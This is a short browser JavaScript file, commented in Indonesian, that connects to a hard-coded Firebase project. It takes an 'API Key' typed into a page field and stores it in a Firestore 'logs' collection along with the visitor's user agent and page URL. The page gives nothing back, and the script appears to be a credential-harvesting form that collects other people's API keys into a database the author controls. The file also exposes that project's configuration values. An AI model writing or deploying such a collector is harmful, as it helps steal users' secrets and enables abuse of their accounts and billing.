// ===== KONFIGURASI FIREBASE =====
const firebaseConfig = {
    apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
    authDomain: "metadata-162de.firebaseapp.com",
    projectId: "metadata-162de",
    storageBucket: "metadata-162de.firebasestorage.app",
    messagingSenderId: "619982193399",
    appId: "1:619982193399:web:b3c4111e57e46d6f6f49f2",
    measurementId: "G-Z6RWGEMLXB"
};

// ===== INIT FIREBASE =====
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// ===== ELEMEN =====
const input = document.getElementById('api-input');
const btn = document.getElementById('enter-btn');
const statusDiv = document.getElementById('status');

// ===== FUNGSI =====
function setStatus(text, isSuccess = true) {
    statusDiv.textContent = text;
    statusDiv.style.color = isSuccess ? '#00ffe0' : '#ff7b72';
}

function sendToFirestore(apiKey) {
    setStatus('⏳ Mengirim data...', true);
    db.collection("logs").add({
        api_key: apiKey,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        url: window.location.href
    })
    .then(() => {
        setStatus('✅ Data terkirim ke Firestore!', true);
    })
    .catch((error) => {
        setStatus('❌ Gagal: ' + error.message, false);
        console.error("Firestore error:", error);
    });
}

// ===== EVENT =====
btn.addEventListener('click', function() {
    const key = input.value.trim();
    if (key === '') {
        setStatus('⚠️ Masukkan API Key!', false);
        return;
    }
    sendToFirestore(key);
});

input.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') btn.click();
});
